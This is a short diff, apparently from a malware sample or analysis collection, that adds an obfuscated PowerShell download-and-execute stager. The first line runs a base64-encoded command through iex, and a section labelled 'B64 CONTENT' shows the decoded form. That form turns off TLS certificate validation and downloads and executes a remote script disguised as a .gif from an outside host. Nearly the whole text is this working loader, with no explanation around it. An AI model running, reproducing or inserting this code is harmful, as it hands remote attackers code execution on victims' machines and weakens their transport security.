@@ -1,0 +1,7 @@
+iex([SYsTeM.tExT.enCodIng]::uTF8.gETsTring([sYStEM.CONVeRT]::frOMbAse64string('CltTeXNURU0uTmVULnNFclZpY0VQb2luVG1BbmFnRXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHskdFJVRX07SUVYICgobmV3LW9iamVjdCBuRXQuV2ViY0xJZW5UKS5kT1dubG9BRFNUUkluZygnaHR0cHM6Ly93d3cuc2VjdXJpdHktc3VwcG9ydC50ZWNoL2FsYy5naWYnKSkKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+[SysTEM.NeT.sErVicEPoinTmAnagEr]::ServerCertificateValidationCallback = {$tRUE};IEX ((new-object nEt.WebcLIenT).dOWnloADSTRIng('https://www.security-support.tech/alc.gif'))
+
